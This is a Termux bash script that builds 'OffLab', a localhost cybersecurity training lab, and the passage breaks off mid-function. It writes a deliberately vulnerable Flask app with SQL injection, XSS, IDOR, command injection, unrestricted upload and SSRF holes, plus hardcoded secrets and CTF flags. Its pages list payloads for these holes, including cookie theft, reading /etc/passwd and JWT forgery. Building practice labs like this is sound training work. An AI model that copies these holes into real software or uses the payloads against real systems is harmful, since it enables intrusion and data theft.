#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#  OffLab - Offensive Cybersecurity Lab Setup (v2.6)
#  LOCALHOST ONLY | Educational Purpose
#  Perbaikan: Jinja2 safe, flag escaping, UI profesional,
#             bug launcher (press_enter & BLUE missing)
# ============================================================

set -e

# ─── WARNA (bash) ─────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; DIM='\033[2m'; BOLD='\033[1m'; RESET='\033[0m'

LAB_DIR="$HOME/offlab"
VENV_DIR="$LAB_DIR/venv"
APPS_DIR="$LAB_DIR/apps"
TOOLS_DIR="$LAB_DIR/tools"
NOTES_DIR="$LAB_DIR/notes"
LOG_FILE="$LAB_DIR/lab.log"

# ─── HELPER FUNCTIONS ──────────────────────────────────────
banner() {
  clear
  echo -e "${BLUE}${BOLD}"
  cat << 'EOF'
  ┌─────────────────────────────────────────────────┐
  │           O F F L A B   v 2 . 6                 │
  │   Offensive Cybersecurity Lab for Termux       │
  │   LOCALHOST ONLY | EDUCATIONAL USE              │
  └─────────────────────────────────────────────────┘
EOF
  echo -e "${RESET}"
}

info()    { echo -e "${CYAN}[*]${RESET} $1"; }
success() { echo -e "${GREEN}[+]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
error()   { echo -e "${RED}[-]${RESET} $1"; }
step()    { echo -e "${MAGENTA}[>]${RESET} ${BOLD}$1${RESET}"; }
line()    { echo -e "${DIM}────────────────────────────────────────────${RESET}"; }
log()     { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE" 2>/dev/null; }

press_enter() { echo -e "\n${DIM}Tekan ENTER untuk lanjut...${RESET}"; read -r; }

confirm() {
  echo -e "${YELLOW}$1 (y/n):${RESET} \c"
  read -r ans
  [[ "$ans" =~ ^[Yy]$ ]]
}

# ─── DISCLAIMER ────────────────────────────────────────────
show_disclaimer() {
  banner
  echo -e "${YELLOW}${BOLD}⚠ DISCLAIMER & PERSETUJUAN PENGGUNA${RESET}"
  line
  echo ""
  echo -e "${WHITE}Lab ini dibuat KHUSUS untuk:${RESET}"
  echo -e "  ${GREEN}✓${RESET} Latihan di lingkungan LOCALHOST / lokal Termux"
  echo -e "  ${GREEN}✓${RESET} Tujuan edukasi cybersecurity ofensif"
  echo -e "  ${GREEN}✓${RESET} Penelitian & pengembangan skill defensif"
  echo ""
  echo -e "${WHITE}DILARANG KERAS:${RESET}"
  echo -e "  ${RED}✗${RESET} Menyerang sistem tanpa izin eksplisit"
  echo -e "  ${RED}✗${RESET} Menggunakan tools ini pada target publik/orang lain"
  echo -e "  ${RED}✗${RESET} Melanggar hukum ITE atau hukum siber negara manapun"
  echo ""
  echo -e "${DIM}Dengan melanjutkan, kamu menyetujui penggunaan yang sah.${RESET}"
  echo ""
  if ! confirm "Saya mengerti dan setuju dengan disclaimer ini"; then
    error "Setup dibatalkan."
    exit 1
  fi
}

# ─── INSTALL DEPENDENCIES ──────────────────────────────────
install_deps() {
  banner
  step "INSTALASI DEPENDENCY TERMUX"
  line

  info "Update package manager..."
  pkg update -y -q 2>/dev/null || warn "Update gagal, lanjut..."
  pkg upgrade -y -q 2>/dev/null || warn "Upgrade gagal, lanjut..."

  PACKAGES=(
    python python-pip git curl wget
    nmap netcat-openbsd openssh
    sqlite dnsutils termux-tools
    tcpdump tsu busybox
  )

  for pkg_name in "${PACKAGES[@]}"; do
    if pkg list-installed 2>/dev/null | grep -q "^$pkg_name"; then
      success "$pkg_name sudah terinstall"
    else
      info "Install $pkg_name..."
      pkg install -y "$pkg_name" -q 2>/dev/null && success "$pkg_name OK" || warn "$pkg_name gagal (optional)"
    fi
  done

  info "Setup Python virtual environment..."
  mkdir -p "$LAB_DIR" "$APPS_DIR" "$TOOLS_DIR" "$NOTES_DIR"

  if [ ! -d "$VENV_DIR" ]; then
    python -m venv "$VENV_DIR"
    success "Virtualenv dibuat di $VENV_DIR"
  else
    success "Virtualenv sudah ada"
  fi

  source "$VENV_DIR/bin/activate"

  PY_PACKAGES=(
    flask requests colorama tabulate
  )

  info "Install Python packages..."
  for ppkg in "${PY_PACKAGES[@]}"; do
    pip install "$ppkg" -q 2>/dev/null && success "$ppkg OK" || warn "$ppkg gagal"
  done

  deactivate
  success "Semua dependency terinstall!"
  log "Dependencies installed"
}

# ─── BUAT VULNERABLE WEB APP (UI BARU + FIX) ──────────────
create_vuln_app() {
  info "Membuat vulnerable web application dengan UI profesional (fixed)..."

  cat > "$APPS_DIR/vulnapp.py" << 'PYEOF'
#!/usr/bin/env python3
"""
OffLab Vulnerable Web App - Desain profesional, mobile-friendly, fixed Jinja2
Sengaja rentan untuk latihan. LOCALHOST ONLY.
"""
from flask import Flask, request, render_template_string, redirect, session, jsonify
import sqlite3, os, subprocess, hashlib, json, base64, time, urllib.request

app = Flask(__name__)
app.secret_key = 'supersecretkey123'
DB_PATH = os.path.join(os.path.dirname(__file__), 'lab.db')

# ── Database init ──────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT DEFAULT 'user',
            email TEXT,
            secret TEXT
        );
        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            title TEXT,
            content TEXT,
            private INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY,
            name TEXT,
            price REAL,
            description TEXT
        );
    """)
    # Seed data (flag sudah menggunakan HTML entity untuk kurung kurawal)
    users = [
        (1,'admin','21232f297a57a5a743894a0e4a801fc3','admin','admin@lab.local','FLAG&#123;SQL1_4dm1n_f0und&#125;'),
        (2,'alice','6384e2b2184bcbf58eccf10ca7a6563c','user','alice@lab.local','FLAG&#123;1D0R_pr1v4t3_n0t3&#125;'),
        (3,'bob','9f9d51bc70ef21ca5c14f307980a29d8','user','bob@lab.local','FLAG&#123;s3ss10n_h1j4ck&#125;'),
        (4,'carol','5f4dcc3b5aa765d61d8327deb882cf99','moderator','carol@lab.local','FLAG&#123;pr1v3sc_4cc3ss&#125;'),
    ]
    notes_data = [
        (1,2,'My Secret Note','This is alice private note. FLAG&#123;1D0R_pr1v4t3_n0t3&#125;',1),
        (2,2,'Public Note','Hello world this is public',0),
        (3,1,'Admin Note','Admin secret: FLAG&#123;4DM1N_N0T3_4CC3SS&#125;',1),
        (4,3,'Bob Note','Bob private content here',1),
    ]
    products_data = [
        (1,'Laptop Pro',999.99,'High performance laptop'),
        (2,'Mouse Wireless',29.99,'Ergonomic wireless mouse'),
        (3,'Keyboard Mech',149.99,'Mechanical keyboard'),
    ]
    try:
        c.executemany("INSERT OR IGNORE INTO users VALUES (?,?,?,?,?,?)", users)
        c.executemany("INSERT OR IGNORE INTO notes VALUES (?,?,?,?,?)", notes_data)
        c.executemany("INSERT OR IGNORE INTO products VALUES (?,?,?,?)", products_data)
    except: pass
    conn.commit()
    conn.close()

# ── BASE TEMPLATE (UI profesional) ─────────────────────────
BASE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OffLab – {{page_title}}</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background: #f5f7fa;
    color: #2c3e50;
    line-height: 1.5;
    min-height: 100vh;
  }
  a { color: #2980b9; text-decoration: none; }
  a:hover { text-decoration: underline; }
  .navbar {
    background: #2c3e50;
    color: #ecf0f1;
    padding: 12px 20px;
    display: flex;
    flex-wrap: wrap;
    align-items: center;
    justify-content: space-between;
    font-size: 15px;
  }
  .navbar .brand { font-weight: bold; font-size: 16px; color: #ecf0f1; }
  .navbar .menu { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px; }
  @media (min-width: 601px) { .navbar .menu { margin-top: 0; } }
  .navbar a {
    color: #bdc3c7;
    padding: 6px 10px;
    border-radius: 4px;
    font-size: 14px;
  }
  .navbar a:hover { background: #34495e; color: #ecf0f1; text-decoration: none; }
  .user-info { font-size: 14px; }
  .user-info a { margin-left: 8px; color: #e74c3c; }
  .container { max-width: 960px; margin: 30px auto; padding: 0 20px; }
  .card {
    background: #ffffff;
    border-radius: 8px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    padding: 24px;
    margin-bottom: 20px;
  }
  .card h2 {
    font-size: 18px;
    color: #2c3e50;
    margin-bottom: 12px;
    border-bottom: 2px solid #ecf0f1;
    padding-bottom: 8px;
    font-weight: 600;
  }
  input, textarea, select {
    width: 100%;
    padding: 10px 12px;
    margin: 6px 0 12px;
    border: 1px solid #bdc3c7;
    border-radius: 4px;
    font-size: 15px;
    font-family: inherit;
  }
  input:focus, textarea:focus {
    outline: none;
    border-color: #2980b9;
    box-shadow: 0 0 0 2px rgba(41,128,185,0.2);
  }
  button, .btn {
    background: #2980b9;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px 20px;
    font-size: 15px;
    cursor: pointer;
    font-weight: 500;
  }
  button:hover, .btn:hover { background: #1c5980; }
  .btn-green { background: #27ae60; }
  .btn-green:hover { background: #1e8449; }
  .alert {
    padding: 12px 16px;
    border-radius: 4px;
    margin: 12px 0;
    font-size: 14px;
  }
  .alert-error { background: #fdedec; border-left: 4px solid #e74c3c; color: #922b21; }
  .alert-success { background: #eafaf1; border-left: 4px solid #27ae60; color: #145a32; }
  .alert-info { background: #eaf2f8; border-left: 4px solid #2980b9; color: #1a5276; }
  table { width: 100%; border-collapse: collapse; font-size: 14px; margin: 12px 0; }
  th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
  th { background: #f8f9fa; font-weight: 600; }
  .module-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
    margin: 20px 0;
  }
  .module-card {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    padding: 16px;
    display: block;
    text-decoration: none;
    color: #2c3e50;
    transition: transform 0.1s, box-shadow 0.1s;
  }
  .module-card:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0,0,0,0.12);
    text-decoration: none;
    color: #2c3e50;
  }
  .module-card h3 { font-size: 15px; color: #2980b9; margin-bottom: 6px; }
  .module-card p { font-size: 13px; color: #7f8c8d; margin-bottom: 8px; }
  .tag { display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 10px; margin: 2px; }
  .tag-high { background: #fdedec; color: #c0392b; }
  .tag-med { background: #fef9e7; color: #b7950b; }
  .tag-low { background: #eafaf1; color: #1e8449; }
  pre {
    background: #f8f9fa;
    border: 1px solid #e5e8eb;
    border-radius: 4px;
    padding: 14px;
    overflow-x: auto;
    font-size: 13px;
    line-height: 1.4;
    white-space: pre-wrap;
    word-break: break-word;
  }
  hr { border: none; border-top: 1px solid #ecf0f1; margin: 20px 0; }
  .flag { color: #c0392b; font-weight: 600; background: #fdedec; padding: 2px 6px; border-radius: 4px; }
  @media (max-width: 600px) {
    .container { padding: 0 12px; margin: 20px auto; }
    .card { padding: 16px; }
    button, .btn { width: 100%; }
    .module-grid { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>
<div class="navbar">
  <span class="brand">OffLab v2</span>
  <div class="menu">
    <a href="/">Home</a>
    <a href="/sqli">SQLi</a>
    <a href="/xss">XSS</a>
    <a href="/idor">IDOR</a>
    <a href="/auth">Auth</a>
    <a href="/cmdi">CMDi</a>
    <a href="/upload">Upload</a>
    <a href="/api">API</a>
    <a href="/hints">Hints</a>
  </div>
  <div class="user-info">
    {% if session.username %}
      <span>{{ session.username }}</span>
      <a href="/logout">Logout</a>
    {% else %}
      <a href="/login">Login</a>
    {% endif %}
  </div>
</div>
<div class="container">
{{ content | safe }}
</div>
</body>
</html>
"""

def render_page(title, content):
    return render_template_string(BASE_HTML, page_title=title, content=content)

# ── HOME ───────────────────────────────────────────────────
@app.route('/')
def home():
    content = """
    <div class="card">
      <h2>Welcome to OffLab Vulnerable Web Application</h2>
      <p style="color:#7f8c8d;font-size:15px;margin-bottom:12px">
        Aplikasi ini sengaja dibuat rentan untuk latihan keamanan siber. <strong>Localhost only.</strong>
      </p>
      <div class="alert alert-info">
        Tujuan: Temukan semua flag <code>FLAG{...}</code> yang tersembunyi di aplikasi ini.
      </div>
    </div>
    <div class="module-grid">
      <a href="/sqli" class="module-card">
        <h3>SQL Injection</h3>
        <p>Login bypass, data extraction, blind SQLi</p>
        <span class="tag tag-high">HIGH</span>
      </a>
      <a href="/xss" class="module-card">
        <h3>Cross-Site Scripting</h3>
        <p>Reflected, stored, DOM-based XSS</p>
        <span class="tag tag-high">HIGH</span>
      </a>
      <a href="/idor" class="module-card">
        <h3>IDOR / BOLA</h3>
        <p>Broken object level authorization</p>
        <span class="tag tag-high">HIGH</span>
      </a>
      <a href="/auth" class="module-card">
        <h3>Auth Bypass</h3>
        <p>Broken auth, session flaws, JWT</p>
        <span class="tag tag-high">HIGH</span>
      </a>
      <a href="/cmdi" class="module-card">
        <h3>Command Injection</h3>
        <p>OS command injection via input</p>
        <span class="tag tag-high">HIGH</span>
      </a>
      <a href="/upload" class="module-card">
        <h3>File Upload</h3>
        <p>Unrestricted file upload abuse</p>
        <span class="tag tag-med">MED</span>
      </a>
      <a href="/api" class="module-card">
        <h3>API Lab</h3>
        <p>REST API misconfig, IDOR via API</p>
        <span class="tag tag-med">MED</span>
      </a>
      <a href="/ssrf" class="module-card">
        <h3>SSRF</h3>
        <p>Server-Side Request Forgery</p>
        <span class="tag tag-high">HIGH</span>
      </a>
    </div>
    <div class="card">
      <h2>Flag Tracker</h2>
      <p style="font-size:14px;color:#7f8c8d;margin-bottom:10px">Daftar flag yang harus ditemukan:</p>
      <div style="background:#f8f9fa;border:1px solid #e5e8eb;border-radius:4px;padding:12px;font-size:13px">
        FLAG&#123;SQL1_4dm1n_f0und&#125;   - SQL Injection Lab<br>
        FLAG&#123;1D0R_pr1v4t3_n0t3&#125; - IDOR Lab<br>
        FLAG&#123;s3ss10n_h1j4ck&#125;    - Session Lab<br>
        FLAG&#123;pr1v3sc_4cc3ss&#125;    - Privilege Escalation<br>
        FLAG&#123;4DM1N_N0T3_4CC3SS&#125; - Admin Access<br>
        FLAG&#123;XSS_r3fl3ct3d&#125;     - Reflected XSS<br>
        FLAG&#123;XSS_st0r3d&#125;        - Stored XSS<br>
        FLAG&#123;CMDI_3x3c&#125;         - Command Injection<br>
        FLAG&#123;UPLAOD_RCE&#125;        - File Upload<br>
        FLAG&#123;SSRF_l0c4l&#125;        - SSRF
      </div>
    </div>
    """
    return render_page("Home", content)

# ── SQL INJECTION LAB ──────────────────────────────────────
@app.route('/sqli', methods=['GET','POST'])
def sqli():
    result = ""
    query_shown = ""
    if request.method == 'POST' and 'sqli_login' in request.form:
        username = request.form.get('username','')
        password = request.form.get('password','')
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        query_shown = query
        try:
            conn = sqlite3.connect(DB_PATH)
            rows = conn.execute(query).fetchall()
            conn.close()
            if rows:
                result = f'<div class="alert alert-success">Login berhasil sebagai: {rows[0][1]} (role: {rows[0][3]}) | Secret: <span class="flag">{rows[0][5]}</span></div>'
            else:
                result = '<div class="alert alert-error">Login gagal</div>'
        except Exception as e:
            result = f'<div class="alert alert-error">Error: {str(e)}</div>'

    search_result = ""
    search_query = ""
    if request.method == 'POST' and 'sqli_search' in request.form:
        term = request.form.get('search_term','')
        query2 = f"SELECT id, name, price, description FROM products WHERE name LIKE '%{term}%'"
        search_query = query2
        try:
            conn = sqlite3.connect(DB_PATH)
            rows = conn.execute(query2).fetchall()
            conn.close()
            if rows:
                tbl = "<table><tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th></tr>"
                for r in rows:
                    tbl += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
                tbl += "</table>"
                search_result = f'<div class="alert alert-success">Ditemukan {len(rows)} hasil</div>' + tbl
            else:
                search_result = '<div class="alert alert-info">Tidak ada hasil</div>'
        except Exception as e:
            search_result = f'<div class="alert alert-error">Error DB: {str(e)}</div>'

    content = f"""
    <div class="card">
      <h2>SQL Injection Lab</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Bypass login, ekstrak data user, ambil FLAG<br>
        <small>Hint: Coba ' OR '1'='1 atau ' OR 1=1-- di field username</small>
      </div>
    </div>
    <div class="card">
      <h2>Lab 1: Login Bypass</h2>
      <form method="POST">
        <input type="hidden" name="sqli_login" value="1">
        <input type="text" name="username" placeholder="Username" value="">
        <input type="text" name="password" placeholder="Password (bisa diisi apa saja)">
        <button type="submit">Login</button>
      </form>
      {result}
      {"<pre>Query: " + query_shown + "</pre>" if query_shown else ""}
      <hr>
      <p style="font-size:14px; color:#7f8c8d">Payload ideas:</p>
      <pre>Username: admin'--
Username: ' OR '1'='1'--
Username: ' UNION SELECT 1,username,password,role,email,secret FROM users--</pre>
    </div>
    <div class="card">
      <h2>Lab 2: Search UNION Injection</h2>
      <form method="POST">
        <input type="hidden" name="sqli_search" value="1">
        <input type="text" name="search_term" placeholder="Cari produk..." value="{request.form.get('search_term','') if request.method=='POST' else ''}">
        <button type="submit">Cari</button>
      </form>
      {search_result}
      {"<pre>Query: " + search_query + "</pre>" if search_query else ""}
      <hr>
      <p style="font-size:14px; color:#7f8c8d">UNION injection untuk extract data lain:</p>
      <pre>' UNION SELECT id,username,password,role FROM users--
' UNION SELECT 1,username,secret,email FROM users--</pre>
    </div>
    """
    return render_page("SQL Injection", content)

# ── XSS LAB ───────────────────────────────────────────────
XSS_STORED = []

@app.route('/xss', methods=['GET','POST'])
def xss():
    msg = ""
    reflected_input = request.args.get('q', '')
    if request.method == 'POST' and 'store_comment' in request.form:
        comment = request.form.get('comment', '')
        name = request.form.get('name', 'Anonymous')
        XSS_STORED.append({'name': name, 'comment': comment})
        msg = '<div class="alert alert-success">Komentar disimpan!</div>'

    stored_comments = ""
    for c in XSS_STORED:
        stored_comments += f"<div style='border:1px solid #ddd;padding:8px;margin:5px 0;font-size:14px'><strong>{c['name']}</strong>: {c['comment']}</div>"

    content = f"""
    <div class="card">
      <h2>Cross-Site Scripting (XSS) Lab</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Eksekusi JavaScript di browser, ambil cookie, bypass filter<br>
        <small>Flag tersembunyi di cookie dan localStorage</small>
      </div>
    </div>
    <div class="card">
      <h2>Lab 1: Reflected XSS</h2>
      <form method="GET" action="/xss">
        <input type="text" name="q" placeholder="Search query..." value="">
        <button type="submit">Search</button>
      </form>
      {"<div class='alert alert-info'>Hasil pencarian untuk: " + reflected_input + "<span style='display:none' id='rFlag'>FLAG&#123;XSS_r3fl3ct3d&#125;</span></div>" if reflected_input else ""}
      <hr>
      <p style="font-size:14px; color:#7f8c8d">Payload ideas:</p>
      <pre>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
?q=&lt;img src=x onerror="alert(document.cookie)"&gt;
?q=&lt;svg onload="alert(document.getElementById('rFlag').textContent)"&gt;</pre>
    </div>
    <div class="card">
      <h2>Lab 2: Stored XSS (Comment Board)</h2>
      {msg}
      <form method="POST">
        <input type="hidden" name="store_comment" value="1">
        <input type="text" name="name" placeholder="Nama kamu">
        <textarea name="comment" placeholder="Komentar..." rows="3"></textarea>
        <button type="submit">Kirim Komentar</button>
      </form>
      <hr>
      <div>
        {stored_comments if stored_comments else "<p style='color:#7f8c8d'>Belum ada komentar</p>"}
      </div>
      <script>document.cookie = "session_flag=FLAG&#123;XSS_st0r3d&#125;; path=/"</script>
      <hr>
      <p style="font-size:14px; color:#7f8c8d">Stored XSS payload:</p>
      <pre>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;
&lt;img src=x onerror="fetch('/?stolen='+btoa(document.cookie))"&gt;</pre>
    </div>
    """
    return render_page("XSS Lab", content)

# ── IDOR LAB ──────────────────────────────────────────────
@app.route('/idor')
def idor():
    content = """
    <div class="card">
      <h2>IDOR / Broken Object Level Authorization</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Akses resource milik user lain dengan mengubah ID<br>
        <small>Login dulu, lalu coba akses note milik user lain</small>
      </div>
    </div>
    <div class="card">
      <h2>Quick Login untuk Lab</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
        <a href="/idor_login?user=alice" class="btn btn-green" style="text-align:center;text-decoration:none">Login sebagai Alice</a>
        <a href="/idor_login?user=bob" class="btn" style="text-align:center;text-decoration:none">Login sebagai Bob</a>
      </div>
    </div>
    <div class="card">
      <h2>Notes (Akses via ID)</h2>
      <p style="color:#7f8c8d">Setelah login, coba akses: /note/1, /note/2, /note/3, /note/4</p>
      <table>
        <tr><th>Note ID</th><th>Pemilik</th><th>Status</th><th>Aksi</th></tr>
        <tr><td>1</td><td>alice</td><td>Private</td><td><a href="/note/1">Akses</a></td></tr>
        <tr><td>2</td><td>alice</td><td>Public</td><td><a href="/note/2">Akses</a></td></tr>
        <tr><td>3</td><td>admin</td><td>Private</td><td><a href="/note/3">Akses</a></td></tr>
        <tr><td>4</td><td>bob</td><td>Private</td><td><a href="/note/4">Akses</a></td></tr>
      </table>
    </div>
    <div class="card">
      <h2>User Profile via API (IDOR di API)</h2>
      <p style="color:#7f8c8d">Akses: /api/user/1, /api/user/2, /api/user/3, /api/user/4</p>
      <pre>
# Dengan curl:
curl http://127.0.0.1:5000/api/user/1
curl http://127.0.0.1:5000/api/user/2
# Coba ubah ID dan lihat apa yang bisa diakses</pre>
    </div>
    """
    return render_page("IDOR Lab", content)

@app.route('/idor_login')
def idor_login():
    user = request.args.get('user','')
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute("SELECT * FROM users WHERE username=?", (user,)).fetchone()
    conn.close()
    if row:
        session['user_id'] = row[0]
        session['username'] = row[1]
        session['role'] = row[3]
    return redirect('/idor')

@app.route('/note/<int:note_id>')
def get_note(note_id):
    conn = sqlite3.connect(DB_PATH)
    note = conn.execute("SELECT n.*, u.username FROM notes n JOIN users u ON n.user_id=u.id WHERE n.id=?", (note_id,)).fetchone()
    conn.close()
    if not note:
        return render_page("Note", '<div class="alert alert-error">Note tidak ditemukan</div>')
    is_own = session.get('user_id') == note[1]
    content = f"""
    <div class="card">
      <h2>Note #{note_id}</h2>
      {'<div class="alert alert-error">IDOR! Kamu mengakses note milik orang lain!</div>' if not is_own and session.get('user_id') else ''}
      <p><strong>Owner:</strong> {note[6]} | <strong>Status:</strong> {'Private' if note[4] else 'Public'}</p>
      <hr>
      <p><strong>{note[2]}</strong></p>
      <p style="margin-top:10px">{note[3]}</p>
      {'<span class="flag">' + note[3] + '</span>' if 'FLAG' in str(note[3]) else ''}
    </div>
    """
    return render_page(f"Note #{note_id}", content)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/login', methods=['GET','POST'])
def login():
    msg = ""
    if request.method == 'POST':
        username = request.form.get('username','')
        password = hashlib.md5(request.form.get('password','').encode()).hexdigest()
        conn = sqlite3.connect(DB_PATH)
        row = conn.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password)).fetchone()
        conn.close()
        if row:
            session['user_id'] = row[0]
            session['username'] = row[1]
            session['role'] = row[3]
            return redirect('/')
        msg = '<div class="alert alert-error">Username/password salah</div>'
    content = f"""
    <div class="card">
      <h2>Login</h2>
      {msg}
      <form method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
      </form>
      <hr>
      <p style="color:#7f8c8d">Credentials tersedia (MD5 hash di DB):</p>
      <pre>admin / admin  - role: admin
alice / password123 - role: user
bob   / bob    - role: user</pre>
    </div>
    """
    return render_page("Login", content)

# ── COMMAND INJECTION LAB ──────────────────────────────────
@app.route('/cmdi', methods=['GET','POST'])
def cmdi():
    output = ""
    if request.method == 'POST':
        host = request.form.get('host','')
        if host:
            try:
                cmd = f"ping -c 1 {host}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                out = result.stdout + result.stderr
                output = f"<pre>{out}</pre>"
                if any(x in host for x in [';','&&','||','`','$(']):
                    output += '<div class="alert alert-error">Command injection terdeteksi! Good job!</div>'
            except subprocess.TimeoutExpired:
                output = '<div class="alert alert-error">Timeout</div>'
            except Exception as e:
                output = f'<pre>Error: {str(e)}</pre>'
    content = f"""
    <div class="card">
      <h2>Command Injection Lab</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Inject OS command melalui input parameter<br>
        <small>Gunakan metacharacter: ; && || ` $()</small>
      </div>
    </div>
    <div class="card">
      <h2>Network Ping Tool (Vulnerable)</h2>
      <form method="POST">
        <input type="text" name="host" placeholder="Masukkan hostname/IP..." value="{request.form.get('host','') if request.method=='POST' else ''}">
        <button type="submit">Ping</button>
      </form>
      {output}
      <hr>
      <p style="font-size:14px; color:#7f8c8d">Payload ideas:</p>
      <pre>127.0.0.1; id
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1; echo FLAG&#123;CMDI_3x3c&#125;</pre>
    </div>
    """
    return render_page("Command Injection", content)

# ── FILE UPLOAD LAB ───────────────────────────────────────
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/upload', methods=['GET','POST'])
def upload():
    msg = ""
    uploaded_files = os.listdir(UPLOAD_DIR)
    if request.method == 'POST':
        if 'file' not in request.files:
            msg = '<div class="alert alert-error">Tidak ada file</div>'
        else:
            f = request.files['file']
            if f.filename:
                filepath = os.path.join(UPLOAD_DIR, f.filename)
                f.save(filepath)
                msg = f'<div class="alert alert-success">File "{f.filename}" berhasil diupload! <span class="flag">FLAG&#123;UPLAOD_RCE&#125;</span></div>'
                uploaded_files = os.listdir(UPLOAD_DIR)
    file_list = ""
    for fname in uploaded_files:
        file_list += f"<div style='font-size:14px;padding:4px 0;border-bottom:1px solid #eee'>{fname}</div>"
    content = f"""
    <div class="card">
      <h2>File Upload Lab</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Upload file berbahaya melewati validasi<br>
        <small>Coba upload: .php, .py, .sh, file dengan ekstensi ganda (.jpg.php)</small>
      </div>
    </div>
    <div class="card">
      <h2>Upload File (No Validation)</h2>
      <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit" style="margin-top:10px">Upload</button>
      </form>
      {msg}
    </div>
    <div class="card">
      <h2>File yang Diupload</h2>
      {file_list if file_list else "<p style='color:#7f8c8d'>Belum ada file</p>"}
    </div>
    """
    return render_page("File Upload", content)

# ── SSRF LAB ──────────────────────────────────────────────
@app.route('/ssrf', methods=['GET','POST'])
def ssrf():
    result = ""
    if request.method == 'POST':
        url = request.form.get('url','')
        if url:
            try:
                with urllib.request.urlopen(url, timeout=3) as resp:
                    body = resp.read(500).decode('utf-8','ignore')
                result = f"""
                <div class="alert alert-success">SSRF Berhasil! Server mengambil URL: {url}</div>
                <pre>{body[:300]}...</pre>
                <div class="alert alert-error"><span class="flag">FLAG&#123;SSRF_l0c4l&#125;</span></div>
                """
            except Exception as e:
                result = f'<div class="alert alert-error">Error: {str(e)}</div>'
    content = f"""
    <div class="card">
      <h2>SSRF - Server-Side Request Forgery</h2>
      <div class="alert alert-info">
        <strong>Tujuan:</strong> Paksa server melakukan request ke URL internal<br>
        <small>Coba akses: file:///etc/passwd, http://127.0.0.1:PORT</small>
      </div>
    </div>
    <div class="card">
      <h2>URL Fetcher (Vulnerable)</h2>
      <form method="POST">
        <input type="text" name="url" placeholder="Masukkan URL..." value="{request.form.get('url','') if request.method=='POST' else ''}">
        <button type="submit">Fetch URL</button>
      </form>
      {result}
      <hr>
      <p style="font-size:14px; color:#7f8c8d">SSRF payload ideas:</p>
      <pre>file:///etc/passwd
file:///etc/hostname
http://127.0.0.1:5000/api/user/1</pre>
    </div>
    """
    return render_page("SSRF Lab", content)

# ── AUTH LAB ──────────────────────────────────────────────
@app.route('/auth')
def auth():
    content = """
    <div class="card">
      <h2>Authentication & Session Lab</h2>
      <div class="alert alert-info">
        Eksplor kelemahan autentikasi, session, dan JWT
      </div>
    </div>
    <div class="card">
      <h2>Exercises</h2>
      <table>
        <tr><th>Lab</th><th>Deskripsi</th><th>Endpoint</th></tr>
        <tr><td>1. Weak Password</td><td>Brute force login dengan wordlist</td><td>/login</td></tr>
        <tr><td>2. JWT Forgery</td><td>Decode & forge JWT token</td><td>/auth/jwt</td></tr>
        <tr><td>3. Session Fixation</td><td>Manipulasi session cookie</td><td>/idor_login</td></tr>
        <tr><td>4. Admin Bypass</td><td>Akses panel admin</td><td>/auth/admin</td></tr>
      </table>
    </div>
    <div class="card">
      <h2>JWT Lab</h2>
      <a href="/auth/jwt" class="btn">Buka JWT Lab</a>
      <hr>
      <p style="color:#7f8c8d">JWT dengan algoritma "none" atau weak secret:</p>
      <pre># Decode JWT:
echo "eyJ..." | base64 -d

# Forge dengan alg:none:
header = {"alg":"none","typ":"JWT"}
payload = {"user":"admin","role":"admin"}
token = base64(header) + "." + base64(payload) + "."

# Tools:
jwt_tool, hashcat (brute JWT secret)</pre>
    </div>
    """
    return render_page("Auth Lab", content)

@app.route('/auth/jwt', methods=['GET','POST'])
def jwt_lab():
    import time
    msg = ""
    token_to_show = ""
    if request.method == 'POST' and 'get_token' in request.form:
